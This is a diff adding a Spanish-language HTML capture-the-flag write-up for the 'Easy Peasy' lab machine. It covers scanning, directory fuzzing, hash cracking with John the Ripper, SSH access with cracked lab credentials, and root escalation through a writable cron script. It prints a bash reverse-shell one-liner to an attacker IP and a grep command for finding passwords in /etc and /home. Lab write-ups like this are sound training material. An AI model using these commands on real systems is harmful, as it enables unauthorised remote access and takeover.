@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Easy Peasy - Writeup Log4Nico</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: #00060e;
+      color: #e6e6e6;
+      font-family: serif;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 2rem auto;
+      background: #292e39;
+      border-radius: 10px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.18);
+      padding: 2rem 2.5rem;
+    }
+    h1 {
+      color: limegreen;
+    }
+    h2, h3 {
+      color: #70e1f5;
+      margin-top: 1.5em;
+    }
+    pre, code {
+      background: #181c22;
+      color: #d1d1d1;
+      border-radius: 4px;
+      padding: 0.5em;
+      font-family: serif;
+    }
+    blockquote {
+      border-left: 4px solid #70e1f5;
+      background: #23272f;
+      margin: 1em 0;
+      padding: 0.7em 1em;
+      color: #b0b8c1;
+      font-style: italic;
+    }
+    img {
+      max-width: 100%;
+      border-radius: 6px;
+      margin: 1em 0;
+      box-shadow: 0 1px 6px rgba(0,0,0,0.12);
+    }
+    ul, ol {
+      margin-left: 2em;
+    }
+    .flag {
+      display: inline-block;
+      background: #181c22;
+      color: #70e1f5;
+      border-radius: 4px;
+      padding: 0.2em 0.7em;
+      font-weight: bold;
+      margin: 0.2em 0;
+    }
+    .section {
+      margin-bottom: 2em;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Easy Peasy</h1>
+    <div class="section">
+      <h2>Análisis</h2>
+      <p>Empezamos con un escaneo de puertos sencillo y seguimos con uno más complejo para ver más información de los servicios instalados:</p>
+      <img src="img/image.png" alt="Escaneo de puertos">
+      <img src="img/image-1.png" alt="Escaneo detallado">
+
+      <p>Servicios detectados:</p>
+      <ul>
+        <li>Puerto 80: nginx 1.16.1</li>
+        <li>Puerto 6498: OpenSSH 7.6p1</li>
+        <li>Puerto 65524: Apache httpd 2.4.43</li>
+      </ul>
+
+      <p>Analizando los servicios web uno a uno:</p>
+      <img src="img/image-2.png" alt="Servicios web">
+      <img src="img/image-3.png" alt="Servicios web 2">
+
+      <h3>nginx</h3>
+      <img src="img/image-4.png" alt="nginx">
+      <p>Fuzzeando directorios:</p>
+      <ul>
+        <li>
+          <strong>/hidden</strong>
+          <img src="img/image-5.png" alt="hidden">
+          <img src="img/image-7.png" alt="hidden 2">
+          <p>No parece que la imagen tenga algo escondido.</p>
+          <img src="img/image-8.png" alt="hidden 3">
+          <img src="img/image-9.png" alt="hidden 4">
+          <img src="img/image-10.png" alt="hidden 5"><br>
+          <blockquote class="flag">Primera flag</blockquote><br><br>
+        </li>
+        <li>
+          <strong>robots.txt</strong>
+          <img src="img/image-6.png" alt="robots.txt nginx">
+          <blockquote><strong>F</strong></blockquote>
+        </li>
+      </ul>
+
+      <h3>apache</h3>
+      <img src="img/image-11.png" alt="apache">
+      <ul>
+        <li>
+          <strong>index.html</strong>
+          <img src="img/image-12.png" alt="index.html">
+          <img src="img/image-13.png" alt="index.html 2">
+          <img src="img/image-17.png" alt="Tercera flag">
+          <blockquote class="flag">Tercera flag</blockquote><br><br>
+        </li>
+        <li>
+          <strong>robots.txt</strong>
+          <img src="img/image-15.png" alt="robots.txt apache">
+          <img src="img/image-16.png" alt="robots.txt apache 2">
+          <pre>Yep, he usado chatGPT para descifrar esto</pre>
+          <blockquote class="flag">Segunda flag</blockquote><br><br>
+        </li>
+        <li>
+          <strong>/n0th1ng3ls3m4tt3r/</strong>
+          <img src="img/image-14.png" alt="n0th1ng3ls3m4tt3r">
+          <p>Contiene el hash de una contraseña y una imagen (raro).</p>
+          <img src="img/image-18.png" alt="hash sha256">
+          <blockquote>Es un hash en sha256</blockquote>
+          <img src="img/image-19.png" alt="john the ripper">
+          <blockquote>La crackeamos con john the ripper</blockquote>
+          <img src="img/image-20.png" alt="john resultado">
+          <img src="img/image-21.png" alt="john resultado 2">
+          <img src="img/image-22.png" alt="john resultado 3">
+          <blockquote>
+            user: <span class="flag">boring</span><br>
+            pass: <span class="flag">iconvertedmypasswordtobinary</span>
+          </blockquote>
+        </li>
+      </ul>
+    </div>
+
+    <div class="section">
+      <h2>Acceso y Escalada de Privilegios</h2>
+      <p>Tenemos usuario y contraseña SSH:</p>
+      <img src="img/image-23.png" alt="ssh boring">
+      <p>Entramos en la máquina como el usuario <strong>boring</strong> (sin privilegios).</p>
+      <img src="img/image-24.png" alt="mensaje rotado">
+      <blockquote>Nos dice que está rotado (ROT)</blockquote>
+      <img src="img/image-25.png" alt="rotado 2">
+
+      <h3>Escalada de privilegios</h3>
+      <img src="img/image-26.png" alt="sudo -l">
+      <blockquote>No podemos ejecutar sudo</blockquote>
+      <img src="img/image-27.png" alt="su">
+      <blockquote>Un programa que nos permite ejecutar comandos por otros usuarios...</blockquote>
+      <img src="img/image-28.png" alt="su root">
+      <blockquote>Pide la contraseña del root, no funciona</blockquote>
+      <pre><code>grep -r "password" /home /etc 2>/dev/null</code></pre>
+      <blockquote>Podría... pero no</blockquote>
+      <img src="img/image-29.png" alt="crontab">
+
+      <p>En <strong>crontab</strong> vemos que hay un archivo que se ejecuta cada minuto por el usuario root.</p>
+      <img src="img/image-30.png" alt="archivo crontab">
+      <h4>Un usuario normal puede editar este archivo.</h4>
+      <img src="img/image-31.png" alt="reverse shell">
+      <blockquote>bash -i &gt;&amp; /dev/tcp/{ip_local}/4242 0&gt;&amp;1</blockquote>
+      <img src="img/image-32.png" alt="reverse shell 2">
+
+      <p>Ponemos un puerto en escucha en nuestra máquina y esperamos un minuto (aprox).</p>
+
+      <img src="img/image-33.png" alt="reverse shell 3">
+      <img src="img/image-34.png" alt="root shell">
+      <p>Y ya estaría, hemos accedido a la máquina con root.</p>
+    </div>
+  </div>
+</body>
+</html>
